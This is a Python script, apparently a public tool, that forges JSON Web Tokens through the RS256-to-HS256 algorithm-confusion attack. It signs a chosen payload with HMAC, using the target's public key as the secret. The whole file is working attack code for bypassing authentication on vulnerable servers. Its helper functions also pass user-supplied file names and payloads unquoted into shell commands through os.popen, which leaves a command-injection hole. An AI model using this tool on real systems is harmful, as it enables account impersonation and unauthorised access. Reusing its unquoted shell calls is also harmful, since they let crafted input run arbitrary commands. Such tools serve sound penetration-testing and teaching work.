#!/usr/bin/python3
import jwt
import os
import base64
import binascii
import json
import argparse
from termcolor import colored

def genPartialJWT(payload):
    encoded_jwt = jwt.encode(json.loads(payload), '', algorithm='HS256')
    array = encoded_jwt.split(".")
    partial_jwt = array[0] + "." + array[1]
    return partial_jwt

def genHexPubKey(pubkey):
    hex_pub_key = os.popen("cat {} | xxd -p | tr -d '\\n'".format(pubkey)).read()
    return hex_pub_key

def signJWT(partial_jwt, hex_pub_key):
    sign = os.popen("echo -n {} | openssl dgst -sha256 -mac HMAC -macopt hexkey:{}".format(partial_jwt, hex_pub_key)).read()
    sign = sign.split("= ")[1].strip()
    return sign

def buildJWT(sign, partial_jwt):
    b64_sign = (base64.urlsafe_b64encode(binascii.a2b_hex(sign))).decode('utf-8').replace('=','')
    new_jwt = partial_jwt + "." + b64_sign
    return new_jwt

def main():
    banner = """
██████╗ ███████╗██████╗ ███████╗ ██████╗     ██████╗     ██╗  ██╗███████╗██████╗ ███████╗ ██████╗
██╔══██╗██╔════╝╚════██╗██╔════╝██╔════╝     ╚════██╗    ██║  ██║██╔════╝╚════██╗██╔════╝██╔════╝
██████╔╝███████╗ █████╔╝███████╗███████╗      █████╔╝    ███████║███████╗ █████╔╝███████╗███████╗
██╔══██╗╚════██║██╔═══╝ ╚════██║██╔═══██╗    ██╔═══╝     ██╔══██║╚════██║██╔═══╝ ╚════██║██╔═══██╗
██║  ██║███████║███████╗███████║╚██████╔╝    ███████╗    ██║  ██║███████║███████╗███████║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝     ╚══════╝    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝
                                                                                      By: 3v4Si0N
"""
    helpbanner = """
###############################################
    Tool for JWT attack algorithm
    RS256 to HS256
    Requisit:
        - You have to know the public key
###############################################
"""
    print (colored(banner, "yellow"))
    print (colored(helpbanner, "red"))
    parser = argparse.ArgumentParser()
    parser.add_argument('payload', help='JSON payload from legitim JWT')
    parser.add_argument('pubkey', help='Public key file to use for signing')
    args = parser.parse_args()

    if (args.payload and args.pubkey):
        payload = args.payload
        pubkey = args.pubkey

        partial_jwt = genPartialJWT(payload)
        hex_pub_key = genHexPubKey(pubkey)
        sign = signJWT(partial_jwt, hex_pub_key)
        new_jwt = buildJWT(sign, partial_jwt)
        print (colored(new_jwt,"green"))

main()
